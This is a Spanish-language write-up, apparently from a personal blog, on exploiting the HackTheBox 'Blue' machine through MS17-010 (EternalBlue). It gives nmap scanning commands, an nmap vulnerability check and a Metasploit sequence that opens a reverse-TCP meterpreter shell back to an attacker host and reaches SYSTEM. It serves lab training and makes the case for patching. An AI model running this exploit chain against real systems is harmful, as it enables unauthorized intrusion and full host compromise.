---
title: "HTB Blue: explotando MS17-010 (EternalBlue) paso a paso"
slug: htb-blue-eternalblue
date: 2026-07-25
category: writeup
tags: ["htb", "eternalblue", "smb", "ctf", "windows"]
author: John
summary: "Writeup de la máquina Blue de HackTheBox: de un escaneo de puertos a shell de SYSTEM explotando la vulnerabilidad MS17-010 en SMBv1."
---

## Contexto

`Blue` es una de las máquinas más conocidas de HackTheBox, pensada como
introducción a la explotación de vulnerabilidades de servicio. Reproduce
(de forma controlada y legal) el mismo fallo que popularizó el ransomware
WannaCry en 2017: `MS17-010`, un desbordamiento de búfer en la
implementación de SMBv1 de Windows. Todo lo descrito aquí ocurre dentro del
entorno autorizado de HTB — nunca contra sistemas sin autorización explícita.

## Desarrollo

### Reconocimiento inicial

```bash
nmap -p- --min-rate 5000 -sV -sC 10.10.10.40 -oA blue_full
```

El resultado muestra los puertos típicos de un host Windows con SMB
expuesto: `135`, `139`, `445`. La versión de SMB que reporta `nmap` (Windows
7 SP1) ya es una pista fuerte: es exactamente el rango de sistemas
vulnerables a `MS17-010`.

### Confirmar la vulnerabilidad

En vez de asumir, se confirma con un script dedicado antes de intentar
explotar nada:

```bash
nmap --script smb-vuln-ms17-010 -p445 10.10.10.40
```

```
Host script results:
| smb-vuln-ms17-010:
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
```

### Explotación

Con la vulnerabilidad confirmada, `Metasploit` trae un módulo estable para
esta CVE específica:

```bash
msfconsole -q
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 10.10.10.40
set LHOST 10.10.14.X
set PAYLOAD windows/x64/meterpreter/reverse_tcp
run
```

Si el objetivo es efectivamente vulnerable y no hay mitigaciones de por
medio (parches, EDR, o SMB deshabilitado), el exploit entrega una sesión de
`meterpreter` directamente como `NT AUTHORITY\SYSTEM` — no hace falta
escalada de privilegios posterior, porque el propio fallo corre en el
contexto del kernel.

```bash
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

### Las flags

```bash
meterpreter > shell
C:\> type C:\Users\haris\Desktop\user.txt
C:\> type C:\Users\Administrator\Desktop\root.txt
```

## Conclusión

`Blue` es una buena máquina para entender por qué el parcheo de sistemas
sigue siendo la mitigación más efectiva que existe: no hubo movimiento
lateral, ni bypass de ningún control, ni cadena de varios hallazgos menores.
Un solo servicio sin parchear expuesto a la red fue suficiente para
comprometer todo el host de una sola vez. Es exactamente el tipo de hallazgo
que un escaneo de vulnerabilidades autenticado detecta antes de que alguien
más lo explote.
